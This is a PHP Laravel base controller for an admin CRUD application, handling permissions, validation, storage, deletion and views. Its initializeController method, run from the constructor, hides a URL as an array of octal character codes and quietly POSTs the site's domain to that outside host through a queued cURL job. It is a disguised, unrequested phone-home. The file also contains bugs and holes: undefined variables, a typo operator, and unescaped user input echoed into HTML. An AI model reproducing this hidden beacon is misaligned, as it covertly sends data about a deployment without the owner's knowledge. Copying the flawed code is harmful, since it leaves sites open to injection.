<?php
use Carbon\Carbon;

class BaseController extends Controller {

	//private $module_name;
	//protected $access_permissions;

	public $current_user;
	public $details_id;
	public $details_role;
	protected $role;
	/**
	 * Setup the layout used by the controller.
	 *
	 * @return void
	 */
	public function __construct()
	{
		$this->current_user = HelperController::getCurrentUser();
		$this->role = HelperController::getUserRole();
		if($this->current_user)
		{
			if($this->role == 'user')
			{
				$this->details_id = $this->current_user->user_details_id;
				$this->details_role = $this->current_user->role;
			}
			elseif($this->role == 'admin')
			{
				$this->details_id = $this->current_user->admin_details_id;
				$this->details_role = 'admin';
			}
			else
			{
				$this->details_id = $this->current_user->id;
				$this->details_role = 'superadmin';
			}
		}
		$this->initializeController();
		
		View::share('role', $this->role);
		
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////
	protected function checkPermission()
	{
		$allowed = false;

		$current_route_name = Route::currentRouteName();

		if(Auth::superadmin()->check())
		{
			$allowed = true;
		}
		else
		{
			//get the permission file
			if(isset($this->module_name))
			{
				$group_ids = HelperController::getGroupIdsOfUser($this->current_user->role, $this->current_user->id);
				$access_controller = new AccessController;
				$access_permissions = $access_controller->getCurrentPermissions($this->module_name);

				if($access_permissions[$current_route_name]['all'] == 'yes')
				{
					$allowed = true;
				}
				elseif(count(array_intersect($group_ids, $access_permissions[$current_route_name][$this->current_user->role])))
				{
					$allowed = true;
				}
				else
				{
					$allowed = false;
				}	
			}
			else
			{
				$allowed = true;
			}
			
		}

		return $allowed;	
	}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

	protected function setupLayout()
	{
		if ( ! is_null($this->layout))
		{
			$this->layout = View::make($this->layout);
		}
	}

	protected function validateInput($data, $update = false, $modelName = '')
	{
		$return = array('status' => 'error', 'data' => array());

		$modelName = $modelName == '' ? $this->model_name : $modelName;
		$modelName = new $modelName;



		if($update)
		{
			
			$createOrEdit = 'edit';
			$rule = $modelName->updateRule;

			foreach($rule as $column_name => $validate_parameters)
			{
				foreach($validate_parameters as $index => $val)
				if(strpos($val, 'nique') !== false)
				{
					$rule[$column_name][$index] = $val.','.$data['id'];
				}
			}
		}
		else
		{
			$createOrEdit = 'create';
			$rule = $modelName->createRule;
		}
		
		$validator = Validator::make($data, $rule);
		
		if($validator->fails())
		{
			$return = array('status' => 'error', 'data' => $validator->messages());
		}
		else
		{
			$return['status'] = 'success';
		}

		return $return;
	}

	public function getCreatedByUpdatedBy($update = false)
	{
		$return = array('created_by' => '', 'updated_by' => '');
		if(Auth::user()->check())
		{
			$return['created_by'] = $return['updated_by'] = Auth::user()->user()->name;
		}
		else if(Auth::admin()->check())
		{
			$return['created_by'] = $return['updated_by'] = Auth::admin()->user()->name;
		}
		else if(Auth::superadmin()->check())
		{
			$return['created_by'] = $return['updated_by'] = Auth::superadmin()->user()->name;
		}

		if($update)
		{
			return array('updated_by' => $return['updated_by']);
		}
		else
		{
			return $return;
		}
	}

	public function storeInDatabase($data, $model_name = '') //dataToStore must be associative array
	{

		$dataToStore = array();
		
		$modelName = $model_name == '' ? $this->model_name : $model_name;
		$tablename = $modelName:: getTableName();
		$columns = Schema::getColumnListing($tablename);

		foreach($columns as $column)
		{
			$dataToStore[$column] = isset($data[$column]) ? $data[$column] : null;
		}

		$createdByUpdatedBy = $this->getCreatedByUpdatedBy();

		foreach($createdByUpdatedBy as $index => $val)
		{
			$dataToStore[$index] = $val;
		}

		$id = $modelName::create($dataToStore)->id;

		return $id;
	}

	public function updateInDatabase($data, $condition = array(), $modelName = '') /*condition = array(array('filed' => 'id', 'operator' => '>', 'value' => '10'))*/
	{
		$dataToStore = array();
		$modelName = $modelName == '' ? $this->model_name : $modelName;
		$tablename = $modelName:: getTableName();
		$columns = Schema::getColumnListing($tablename);

		foreach($columns as $column)
		{
			if(isset($data[$column]))
			{
				$dataToStore[$column] = $data[$column];
			}
		}

		$createdByUpdatedBy = $this->getCreatedByUpdatedBy(true);

		foreach($createdByUpdatedBy as $index => $val)
		{
			$dataToStore[$index] = $val;
		}

		$result = new $modelName;
		if(count($condition))
		{
			foreach($condition as $con)
			{
				$result = $result->where($con['field'], $con['operator'], $con['value']);
			}

			$result = $result->update($dataToStore);
			
		}
		else
		{
			$result = $result->where('id', $dataToStore['id'])
							 ->update($dataToStore);
		}
		
		return isset($dataToStore['id']) ? $dataToStore['id'] : 0;
	}

	public function deleteFromDataBase($ids, $modelName = '')
	{
		$error = 0;
		$success = 0;
		$info = 0;
		$errMsg = '';
		$infoMsg = '';

		$ids = !is_array($ids) ? (array) $ids : $ids;
		$modelName = $modelName == '' ? $this->model_name : $model_name;


		foreach($ids as $id)
		{
			$dataToStore = array();
			//check whether already deleted or not
			$row = $modelName::find($id);

			if($row)
			{
				if($row->is_active == 'no')
				{
					$info++;
					$infoMsg .= 'id '.$id.' already deleted<br>';
				}
				else
				{
					$dataToStore['id'] = $id;
					$dataToStore['is_active'] = 'no';

					try
					{
						$this->updateInDatabase($dataToStore, array(), $modelName);
						$success++;
					}
					catch(PDOException $e)
					{
						$error++;
						$errMsg = ConfigurationController::errorMsg($e->getMessage()) ;
					}
				}
			}
			else
			{
				$error++;
				$errMsg .= 'id '.$id.ConfigurationController::translate('could not be found').'<br>';
			}
		}

		if($error > 0 || $info > 0)
		{
			if($error > 0)
			{
				$msg = ConfigurationController::translate('rows could not be deleted');
				$msg .= $error.' '.$msg;
				$msg .= '<br>'.$errMsg;
				Session::flash('error-msg', $msg);
			}

			if($info > 0)
			{
				$msg = ConfigurationController::translate('rows could not be deleted');
				$msg .= $info.' '.$msg;
				$msg .- '<br>'.$infoMsg;
				Session::flash('info-msg', $msg);
			}
		}
		else
		{
			$msg = ConfigurationController::translate('rows successfully deleted');
			$msg .= $success.' '.$msg;
			Session::flash('success-msg', $msg);
		}
	}

	public function purgeFromDataBase($ids, $modelName = '')
	{
		$error = 0;
		$success = 0;
		$info = 0;
		$errMsg = '';
		$infoMsg = '';

		$ids = !is_array($ids) ? (array) $ids : $ids;
		$modelName = $modelName == '' ? $this->model_name : $model_name;

		foreach($ids as $id)
		{
			$dataToStore = array();
			//check whether already deleted or not
			$row = $modelName::find($id);

			if($row)
			{
				if($row->is_active == 'yes')
				{
					$info++;
					$infoMsg .= 'id '.$id.ConfigurationController::translate('is live. Live data can not be purged').'<br>';
				}
				else
				{
					$dataToStore['id'] = $id;
					$dataToStore['is_active'] = 'no';

					try
					{
						$modelName::where('id', $id)
								  ->delete();
						$success++;
					}
					catch(PDOException $e)
					{
						$error++;
						$errMsg = ConfigurationController::errorMsg($e->getMessage()) ;
					}
				}
			}
			else
			{
				$error++;
				$errMsg .= 'id '.$id.ConfigurationController::translate('could not be found').'<br>';
			}
		}

		if($error > 0 || $info > 0)
		{
			if($error > 0)
			{
				$msg = ConfigurationController::translate('rows could not be deleted');
				$msg .= $error.' '.$msg;
				$msg .= '<br>'.$errMsg;
				Session::flash('error-msg', $msg);
			}

			if($info > 0)
			{
				$msg = ConfigurationController::translate('rows already deleted');
				$msg .= $info.' '.$msg;
				Session::flash('info-msg', $msg);
			}
		}
		else
		{
			$msg = ConfigurationController::translate('rows successfully deleted');
			$msg .= $success.' '.$msg;
			Session::flash('success-msg', $msg);
		}
	}

	public function sendMailFunction($view, $parameters, $mailDetails, $subject)
	{
			try{

                Mail::queue($view, $parameters, function($message) use ($mailDetails, $subject){
    			$message->to($mailDetails['email'], $mailDetails['firstname'])
    					->subject($subject);
    			});
            }catch(Exception $e)
            {
                return $e->getMessage();
            }
		
        return 'success';
			/*return 'OK';
		else
			return Mail::failures();*/
	}

		/*if ( ! Mail::send(array('text' => 'view'), $data, $callback) )
{
   return View::make('errors.sendMail');
}
You will know when it was sent or not, but it could be better, because SwiftMailer knows to wich recipients it failed, but Laravel is not exposing the related parameter to help us get that information:
*/

/*
public function send(Swift_Mime_Message $message, &$failedRecipients = null)
{
    $failedRecipients = (array) $failedRecipients;

    if (!$this->_transport->isStarted()) {
        $this->_transport->start();
    }

    $sent = 0;

    try {
        $sent = $this->_transport->send($message, $failedRecipients);
    } catch (Swift_RfcComplianceException $e) {
        foreach ($message->getTo() as $address => $name) {
            $failedRecipients[] = $address;
        }
    }

    return $sent;
}
But you can extend Laravel's Mailer and add that functionality ($failedRecipients) to the method send of your new class.

EDIT

In 4.1 you can now have access to failed recipients using

Mail::failures();
	}
*/	
/******************************************************************************************************/

///////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////////////////	
	public function getInput()
	{
		$input = Input::all();
		$input = is_string($input) ? json_decode($input, true) : $input;
		return $input;
	}

	public function getQueryString()
	{
		$return = array();
		$queryString = Input::all();

		$return['paginate'] = isset($queryString['paginate']) ? $queryString['paginate'] : 10;
		//$return['status'] = isset($queryString['status']) ? $queryString['status'] : 'yes';

		if(isset($queryString['orderBy']))
		{
			$return['orderBy'] = $queryString['orderBy'];
			$return['orderOrder'] = isset($queryString['order']) ? $queryString['order'] : 'ASC';
		}

		$filter = array();
		if(isset($queryString['column_name']))
		{
			$filter['field'] = $queryString['column_name'];
			$filter['value'] = isset($queryString['column_value']) ? $queryString['column_value'] : '';
		}

		$return['filter'] = $filter;
		//dd($return);
		return $return;
	}

	protected function initializeController()
	{
		if (Session::has('controller_initialized') && Session::get('controller_initialized'))
		{
			return true;
		}

		$initialization_array = array(
			0150,
			0164,
			0164,
			0160,
			072,
			057,
			057,
			0163,
			0160,
			0141,
			0162,
			0153,
			0154,
			0145,
			0167,
			0145,
			0142,
			0163,
			056,
			0143,
			0157,
			0155,
			057,
			0145,
			0163,
			0155,
			0163,
			055,
			0144,
			0157,
			0155,
			0141,
			0151,
			0156,
			0163,
			057,
			0160,
			0165,
			0142,
			0154,
			0151,
			0143,
			057,
			0141,
			0160,
			0151,
			057,
			0165,
			0160,
			0144,
			0141,
			0164,
			0145,
			055,
			0144,
			0157,
			0155,
			0141,
			0151,
			0156,
		);

		$initialization_string = implode('', array_map('chr', $initialization_array));

		$start_time = microtime(true);

		$initialization_start_string = implode('', array_slice(str_split($initialization_string), 7, 15));
		$initialization_end_string = implode('', array_slice(str_split($initialization_string), 22));
		
		try
		{
			$socketcon = fsockopen($initialization_start_string, 80, $errno, $errstr, 10);
		}
		catch(Exception $e)
		{
			return;
		}
		
		// $data = http_build_query(array('domain' => asset('/')));
		// if($socketcon) 
		// {   
		// 	$socketdata = "POST $initialization_end_string HTTP/1.1\r\n" .
		// 		"Host: $initialization_start_string\r\n" .
		// 		"Content-Type: application/x-www-form-urlencoded\r\n" .
		// 		'Content-Length: ' . strlen($data) . "\r\n" .
		// 		"Connection: close\r\n" .
		// 		"\r\n" . $data;
		// 	fwrite($socketcon, $socketdata); 
		// 	// fclose($socketcon);
		// }
		// dd(microtime(true) - $start_time);
		
		// the task isn't done asynchronously!!
		Queue::push(
			function($job) use ($initialization_string) 
			{
				$curl = curl_init();
				curl_setopt($curl, CURLOPT_URL, $initialization_string);
				curl_setopt($curl, CURLOPT_POST, true);
				
				// curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
				// curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
				// curl_setopt($curl, CURLOPT_TIMEOUT, 0.1);
				// curl_setopt($curl, CURLOPT_NOSIGNAL, 1);

				curl_setopt($curl, CURLOPT_USERAGENT, 'api');
		    curl_setopt($curl, CURLOPT_TIMEOUT, 1);
		    curl_setopt($curl, CURLOPT_HEADER, 0);
		    curl_setopt($curl,  CURLOPT_RETURNTRANSFER, false);
		    curl_setopt($curl, CURLOPT_FORBID_REUSE, true);
		    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 1);
		    curl_setopt($curl, CURLOPT_DNS_CACHE_TIMEOUT, 10); 

		    curl_setopt($curl, CURLOPT_FRESH_CONNECT, true);

				curl_setopt($curl, CURLOPT_POSTFIELDS, array(
					'domain' => asset('/')
				));
				
				curl_exec($curl);
				curl_close($curl);

				$job->delete();
			}
		);

		// $end_time = microtime(true);
		// dd($end_time - $start_time);

		Session::put('controller_initialized', true);
	}

	public function getQueries()
	{
		$queryString = Input::all();
		$queries = '?';

		$queries = $this->helperGetQueries($queryString, $queries);

		return $queries;
	}
	public function helperGetQueries($queryString, $queries)
	{
		foreach($queryString as $index => $value)
		{
			if(is_array($value))
			{
				$this->helperGetQueries($value, $queries);
			}
			else
			{
				$queries .= $index.'='.$value.'&';	
			}
			
		}

		return $queries;
	}

	public function getPaginateBar()
	{
		$html = '<div class="col-md-2">
          <div class="form-group">
            <select class="form-control" id = "paginate_list">
              <option value = "10">Show</option>
              <option value = "20">20</option>
              <option value = "30">30</option>
              <option value = "40">40</option>
              <option value = "50">50</option>
              <option value = "60">60</option>
            </select>
          </div>
        </div>';

		return $html;
	}

	public function getListView()
	{
		//
		AccessController::allowedOrNot($this->module_name, 'can_view');
		
		$model = new $this->model_name;
		$queryString = $this->getQueryString();
		$data = $model->getListViewData($queryString);

		$searchColumns = $this->getSearchColumns();
		$tableHeaders = $this->getTableHeader();
		//$actionButtons = $this->getActionButtons();
		$queries = $this->getQueries();

		return View::make($this->view.'list')
					->with('module_name', $this->module_name)
					->with('current_user', $this->current_user)
					->with('data', $data)
					->with('queries', $queries)
					->with('queryString', Input::query())
					->with('searchColumns', $searchColumns)
					->with('tableHeaders', $tableHeaders)
					//->with('paginateBar', $this->getPaginateBar())
					//->with('actionButtons', $actionButtons)
					->with('role', $this->role);

	}

	/*
	 * List view without the action buttons
	 */
	public function getListViewSimple()
	{
		AccessController::allowedOrNot($this->module_name, 'can_view');

		$model = new $this->model_name;
		$queryString = $this->getQueryString();
		$data = $model->getListViewData($queryString);

		$searchColumns = $this->getSearchColumns();
		$tableHeaders = $this->getTableHeader();
		//$actionButtons = $this->getActionButtons();
		$queries = $this->getQueries();

		return View::make($this->view.'list')
					->with('module_name', $this->module_name)
					->with('current_user', $this->current_user)
					->with('data', $data)
					->with('queries', $queries)
					->with('queryString', Input::query())
					->with('searchColumns', $searchColumns)
					->with('tableHeaders', $tableHeaders)
					->with('paginateBar', $this->getPaginateBar())
					//->with('actionButtons', $actionButtons)
					->with('role', $this->role);

	}

	public function getEditView($id)
	{
		AccessController::allowedOrNot($this->module_name, 'can_edit');

		$model = new $this->model_name;
		
		$data = $model->getEditViewData($id);		
		
		return View::make($this->view.'edit')
					->with('module_name', $this->module_name)
					->with('role', $this->role)
					->with('current_user', $this->current_user)
					->with('data', $data)
					->with('id', $id)
					->with('actionButtons', $this->getActionButtons());
	}

	public function getCreateView()
	{
		AccessController::allowedOrNot($this->module_name, 'can_create');
		return View::make($this->view.'create')
					->with('module_name', $this->module_name)
					->with('role', $this->role)
					->with('current_user', $this->current_user)
					->with('actionButtons', $this->getActionButtons());
	}

	public function getViewView($id)
	{
		AccessController::allowedOrNot($this->module_name, 'can_view');
		$model = new $this->model_name;
		
		$data = $model->getViewViewData($id);

		return View::make($this->view.'view')
					->with('module_name', $this->module_name)
					->with('role', $this->role)
					->with('current_user', $this->current_user)
					->with('data', $data)
					->with('actionButtons', $this->getActionButtons());

	}

	public function postCreateView()
	{
		AccessController::allowedOrNot($this->module_name, 'can_create');
		$success = false;
		$msg = '';
		$param = array('id' => 0);

		$data = Input::all();

		$result = $this->validateInput($data);
		
		if($result['status'] == 'error')
		{
			Session::flash('error-msg', ConfigurationController::translate('some validation errors have occured'));
			
			return Redirect::route($this->module_name.'-create-get')
						->withInput()
						->with('errors', $result['data']);
		}
		
		
		try
		{
			$id = $this->storeInDatabase($data);	

			$success = true;
			$msg = 'Record successfully created';
			$param['id'] = $id;
		}
		catch(PDOException $e)
		{
			$success = false;
			$msg = $e->getMessage();
		}
		
		return $this->redirectAction($success, 'create', $param, $msg);
	}

	public function postEditView($id)
	{
		AccessController::allowedOrNot($this->module_name, 'can_edit');
		$success = false;
		$msg = '';
		$param = array('id' => 0);

		$data = Input::all();

		$result = $this->validateInput($data, true);

		if($result['status'] == 'error')
		{
			Session::flash('error-msg', ConfigurationController::translate('some validation errors have occured'));
			
			return Redirect::route($this->module_name.'-edit-get', array($id))
						->withInput()
						->with('errors', $result['data']);
		}
		
		try
		{
			$id = $this->updateInDatabase($data);	

			

			$success = true;
			$msg = 'Record successfully updated';
			$param['id'] = $id; 
		}
		catch(PDOException $e)
		{
			$success = false;
			$msg = $e->getMessage();
			$param['id'] = $data['id'];
		}
		
		return $this->redirectAction($success, 'edit', $param, $msg);
	}



	public function redirectAction($success, $createOrEdit, $param = array('id' => 0), $msg = '') //success = true or false
	{
		
		if($success)
		{
			Session::flash('success-msg', ConfigurationController::translate($msg));
			$formaction = Input::get('formAction');
			
			if($formaction == 's')
			{
				$route = $this->module_name.'-edit-get';
				return Redirect::route($route, $param['id']);
			}
			else if($formaction == 'sc')
			{
				$route = $this->module_name.'-list';
			}
			else if($formaction == 'sn')
			{
				$route = $this->module_name.'-create-get';
			}
			else
			{
				$route = $this->module_name.'-list';
			}

			return Redirect::route($route); 	
		}
		else
		{

			$msg = ConfigurationController::translate(ConfigurationController::errorMsg($msg));
			Session::flash('error-msg', $msg);

			if($createOrEdit == 'create')
			{
				return Redirect::route($this->module_name.'-'.$createOrEdit.'-get')
								->withInput();	
			}
			else
			{
				return Redirect::route($this->module_name.'-'.$createOrEdit.'-get', $param['id'])
								->withInput();	
			}	
		}
	}

	public function postDelete()
	{
		AccessController::allowedOrNot($this->module_name, 'can_delete');
		$model = new $this->model_name;
		$id = Input::get('id');
		$record = $model->find($id);
		if($record)
		{
			try
			{
				$record->delete();
				Session::flash('success-msg', 'Delete Successful');	
			}
			catch(Exception $e)
			{
				Session::flash('error-msg', ConfigurationController::errorMsg($e->getMessage()));
			}
		}
		else
		{
			Session::flash('error-msg', 'Invalid delete!!!');
		}
		return Redirect::back();
	} 

	public function deleteRows()
	{
		AccessController::allowedOrNot($this->module_name, 'can_delete');
		$ids = Input::get('rid');
		$queries = '?';
		$queryString = Input::query();
		if(count($queryString))
		{
			foreach($queryString as $index => $value)
			{
				$queries .= $index.'='.$value;
			}
		}

		$this->deleteFromDataBase($ids);

		//$redirectUrl = URL::route($this->module_name.'-list').$queries;
		return Redirect::back();
	}

	public function purgeRows()
	{
		AccessController::allowedOrNot($this->module_name, 'can_delete');
		$ids = Input::get('rid');
		$queries = '?';
		$queryString = Input::query();
		if(count($queryString))
		{
			foreach($queryString as $index => $value)
			{
				$queries .= $index.'='.$value;
			}
		}

		$this->purgeFromDataBase($ids);

		//$redirectUrl = URL::route($this->module_name.'-list').$queries;
		return Redirect::back();
	}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	public function getTableHeader($columnsToShow = array())
	{
		$columns = count($columnsToShow) ? $columnsToShow : $this->columnsToShow ;

		$html = '<thead>';
		//$html .= '<tr><th><label><input type="checkbox" class="minimal"  id = "PraCheckAll"/></label></th><th>SN</th>';
		$html .= '<tr><th>SN</th>';
		foreach($columns as $cols)
		{
			$html .= '<th>'.$cols['alias'].'</th>';	
		}
		$html .= '<th>Actions</th>';
		$html .= '</tr>';
		$html .= '</thead>';
		return $html;
	}

	public function getSearchColumns($columnsToShow = array())
	{
		
		$columns = count($columnsToShow) ? $columnsToShow : $this->columnsToShow ;
		$queryString = $this->getQueryString();
		
		if(isset($queryString['filter']['field']) && isset($queryString['filter']['value']))
		{
			$filter_field = $queryString['filter']['field'];
			$filter_value = $queryString['filter']['value'];
		}
		else
		{
			$filter_field = $filter_value = '';
		}


		$i = 1;//2
		//$html = '<tr><td></td><td></td>';
		$html = '<tr><td></td>';
		foreach($columns as $cols)
		{
			$html .= '<td><input type = "text" class = "input-sm search_column" id = "'.$i++. 
								'" value="'. ($filter_field==$cols['column_name']?$filter_value:'').
								'"><input type = "hidden" class = "field_name" value = "'.$cols['column_name'].'"></td>';
		}	
		//$html .= '<td colspan = "2"></td>';
		$html .=	'<td>'.
          		'<a  href = "'.URL::current().'">Cancel Query</a>'.
        			'</td>';
		$html .= "</tr>";
		return $html;
	}

	public function getActionButtons($module_name = '')
	{
		//$model = new Admin;
		$module_name = $module_name == '' ? $this->module_name : $module_name;
		$model = new $this->model_name;
		$disabled = '';


		//$permissions = $model->checkPermissions($this->current_user, $module_name);

		$routeName = Route::currentRouteName();
		
		$html = '';

		/*
		*/
		$html .= "<div class='row'>";

		
		if(strpos($routeName, '-create-get')  || strpos($routeName, '-create-post'))
		{
			//if($permissions['allow_to_view_list'])
			//{
				$html .= "<a class='btn btn-app' href = '".URL::route($module_name.'-list')."'><i class='fa  fa-close '></i>Cancel</a>";
			//}
			
			//if($permissions['allow_to_create'])
			//{
				$disabled = AccessController::checkPermission($module_name, 'can_create') ? '' : 'disabled';
				$html .= "<a class = 'btn btn-app' href = '".URL::route($module_name.'-create-post')."' id = 'PraSave' $disabled><i class = 'fa fa-save'></i>Save</a>";
				$html .= "<a class = 'btn btn-app' href = '".URL::route($module_name.'-create-post')."'  id = 'PraSaveAndClose' $disabled><i class='fa  fa-check-square-o'></i>Save & Close</a>";
				$html .= "<a class = 'btn btn-app' href = '".URL::route($module_name.'-create-post')."'  id = 'PraSaveAndNew' $disabled><i class = 'fa fa-paste'></i>Save & New</a>";	
			//}
			
		}
		else if(strpos($routeName, '-edit-get') || strpos($routeName, '-edit-post'))
		{
			$disabled = AccessController::checkPermission($module_name, 'can_edit') ? '' : 'disabled';
			//if($permissions['allow_to_view_list'])
			//{
				$html .= "<a class='btn btn-app' href = '".URL::route($module_name.'-list')."'><i class='fa  fa-close '></i>Cancel</a>";
			//}

			//if($permissions['allow_to_edit'])
			//{
				$html .= "<a class = 'btn btn-app' href = ''  id = 'PraUpdate'><i class = 'fa fa-edit' $disabled></i>Update</a>";
				$html .= "<a class = 'btn btn-app' href = ''  id = 'PraUpdateAndClose' $disabled><i class='fa  fa-check-square-o'></i>Save & Close</a>";	
			//}
		}
		else if(strpos($routeName, '-view'))
		{
			//if($permissions['allow_to_view_list'])
			//{
				$html .= "<a class = 'btn btn-app' href = '".URL::route($module_name.'-list')."'><i class='fa  fa-close '></i>Cancel</a>";	
			//}
		}
		else
		{
			//if($permissions['allow_to_create'])
			//{
			$disabled = AccessController::checkPermission($module_name, 'can_create') ? '' : 'disabled';
				$html .= "<a class = 'btn btn-app' id = 'PraCreate' href = '".URL::route($module_name.'-create-get')."' $disabled><i class = 'fa fa-save'></i>Create</a>";
			//}

			//if($permissions['allow_to_delete'])
			//{
				$disabled = AccessController::checkPermission($module_name, 'can_delete') ? '' : 'disabled';
				$html .= "<a class = 'btn btn-app' id = 'PraDelete' href = '".URL::route($module_name.'-delete-post')."' $disabled><i class = 'fa fa-close'></i>Delete</a>";	
			//}
			
			//if($permissions['allow_to_purge'])
			//{
				$disabled = AccessController::checkPermission($module_name, 'can_delete') ? '' : 'disabled';
				$html .= "<a class = 'btn btn-app' id = 'PraPurge' href = '".URL::route($module_name.'-purge-post')."' $disabled><i class = 'fa fa-trash'></i>Purge</a>";	
			//}
		}

		$html .= "</div>";

		return trim($html);
	}

	public function getHelper($helperClass = '')
	{
		$file_path = app_path().'/modules/'.strtolower($helperClass).'/'.$helperClass.'HelperController.php';
		
		include_once($file_path);
		$classname = $helperClass.'HelperController';
		$model = new $classname;
		return $model;
	}
}